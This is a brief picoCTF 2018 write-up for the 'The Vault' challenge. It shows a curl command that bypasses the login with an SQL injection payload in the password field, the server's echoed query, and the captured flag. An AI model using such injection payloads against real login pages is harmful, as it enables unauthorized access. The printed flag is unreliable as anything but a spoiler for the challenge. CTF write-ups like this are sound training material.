# The Vault - Points: 250 - (Solves: 734)

There is a website running at http://2018shell2.picoctf.com:22430 (link).
Try to see if you can login!

---

```sh
% curl -d 'debug=1' -d 'username=admin' -d "password=' or '1'<>'0" http://2018shell2.picoctf.com:22430/login.php
<pre>username: admin
password: ' or '1'&lt;&gt;'0
SQL query: SELECT 1 FROM users WHERE name='admin' AND password='' or '1'&lt;&gt;'0'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{w3lc0m3_t0_th3_vau1t_06857925}</p>%
```

picoCTF{w3lc0m3_t0_th3_vau1t_06857925}
